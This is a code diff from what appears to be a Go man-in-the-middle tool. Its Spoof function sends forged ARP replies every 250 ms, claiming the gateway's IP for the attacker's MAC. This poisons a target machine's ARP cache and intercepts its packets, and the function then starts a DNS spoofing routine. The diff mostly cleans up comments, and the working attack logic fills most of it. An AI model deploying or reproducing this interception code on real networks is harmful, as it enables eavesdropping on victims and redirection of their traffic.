@@ -12,9 +12,10 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
+// Runs and utilizes both the arp and dns spoofing features
 func Spoof(target, gateway hdisc.DevData) {
 	log.Println("Starting spoofing function")
-	stop := make(chan struct{}, 2) // INFO: len 2 because I need to cancel the reading and writing
+	stop := make(chan struct{}, 2) // len of 2 because I need to cancel the reading and writing
 
 	ifi, err := hdisc.LocalIface()
 	if err != nil {
@@ -40,29 +41,27 @@ func Spoof(target, gateway hdisc.DevData) {
 	go func() {
 		for range c {
 			log.Println("Exiting spoofing gracefully ... ")
-			stats.printSummary()
+			// stats.printSummary() // uncomment to get the counters of intercepted packets
 			close(stop)
 		}
 	}()
 
 	go func() {
 		time.Sleep(1 * time.Second)
-		stats.printSummary()
+		// stats.printSummary() // uncomment to get the counters of intercepted packets
 	}()
 
-	// go readARP(handle, stop, ifi)
-	go readARP(handle, stop, target, gateway, stats)
+	go readARP(handle, stop, stats)
 
 	<-WriteARPPack(handle, *localDev, target, gateway, time.Millisecond*250, stop)
 
 	go DNSpoof()
 
 	<-RestoreARPTables(handle, gateway, target)
-	// when there is a signal to stop from writing, continue to return
+
 	return
 }
 
-// as the attackMac a nil can be passed if you want your local machine as the middle man
 func WriteARPPack(handle *pcap.Handle, attacker, target, gateway hdisc.DevData, timeout time.Duration, stop chan struct{}) chan struct{} {
 
 	stopped := make(chan struct{})
@@ -77,15 +76,13 @@ func WriteARPPack(handle *pcap.Handle, attacker, target, gateway hdisc.DevData, 
 				return
 			default:
 				<-t.C
-				// as I am spoofing just one target I should end when there is an error I guess
+
 				p, err := NewARPRep(hdisc.DevData{IP: gateway.IP, Mac: attacker.Mac}, target)
 				if err != nil {
-					// error building new arp request for spoofing
 					log.Printf("Error creating arp request: %s\n", err)
 					continue
 				}
 				if err = handle.WritePacketData(p); err != nil {
-					// error writing packet to open handle
 					log.Printf("Error writing packet to handle: %s\n", err)
 					continue
 				}
@@ -99,7 +96,7 @@ func WriteARPPack(handle *pcap.Handle, attacker, target, gateway hdisc.DevData, 
 					log.Printf("Error writing packet to handle: %s\n", err)
 					continue
 				}
-				// log.Printf("Sending ARP packet: (%s:%s) -> (%s:%s)\n", attacker.IP.String(), attacker.Mac.String(), target.IP.String(), target.Mac.String())
+				// log.Printf("Sending ARP packet: (%s:%s) -> (%s:%s)\n", attacker.IP.String(), attacker.Mac.String(), target.IP.String(), target.Mac.String()) // uncomment for debugging
 			}
 		}
 	}(stopped)
@@ -110,14 +107,6 @@ func WriteARPPack(handle *pcap.Handle, attacker, target, gateway hdisc.DevData, 
 func RestoreARPTables(handle *pcap.Handle, gateway, victim hdisc.DevData) chan struct{} {
 	log.Println("Restoring ARP tables on the victim machine...")
 	stopCh := make(chan struct{})
-
-	// go func() {
-	// 	t := time.NewTicker(time.Second * 5)
-	// 	<-t.C
-	// 	close(stopCh)
-	// }()
-	//
-	// return WriteARPPack(handle, gateway, victim, time.Millisecond*200, stopCh)
 
 	go func() {
 		t := time.NewTicker(time.Millisecond * 250)
@@ -158,8 +147,7 @@ func RestoreARPTables(handle *pcap.Handle, gateway, victim hdisc.DevData) chan s
 	return stopCh
 }
 
-// func readARP(handle *pcap.Handle, stop chan struct{}, ifi *net.Interface) {
-func readARP(handle *pcap.Handle, stop chan struct{}, target, gateway hdisc.DevData, stats *PacketStats) {
+func readARP(handle *pcap.Handle, stop chan struct{}, stats *PacketStats) {
 	ps := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
 	packets := ps.Packets()
 	for {
@@ -168,9 +156,6 @@ func readARP(handle *pcap.Handle, stop chan struct{}, target, gateway hdisc.DevD
 			return
 		case p := <-packets:
 			stats.addFromPacket(p)
-			// data := parsePacket(p)
-			// log.Println(data)
-			// saveToLog(data)
 		}
 	}
 }
